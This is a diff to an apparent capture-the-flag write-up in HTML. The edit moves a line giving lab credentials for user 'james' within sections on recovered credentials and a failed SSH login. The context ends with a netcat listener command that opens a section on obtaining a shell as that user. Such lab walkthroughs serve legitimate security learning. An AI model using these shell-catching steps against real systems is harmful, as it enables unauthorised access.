@@ -650,13 +650,13 @@ cat alexander.txt | base64 -d
 <img src="17.credentials.png" alt="" /><figcaption>17.credentials</figcaption>
 </figure>
 <p>Credentials: <code>james:Hacker@451</code></p>
-<p>Credentials: <code>james:Hacker@4514</code></p>
 <h2 id="ssh">SSH</h2>
 <p>The credentials above didn’t work.</p>
 <p>I looked back and found that I had dropped <code>++.</code> from the source code.</p>
 <figure>
 <img src="18.credentials.png" alt="" /><figcaption>18.credentials</figcaption>
 </figure>
+<p>Credentials: <code>james:Hacker@4514</code></p>
 <p>Anyway, cannot ssh.</p>
 <h2 id="becoming-user-james">Becoming user james</h2>
 <pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
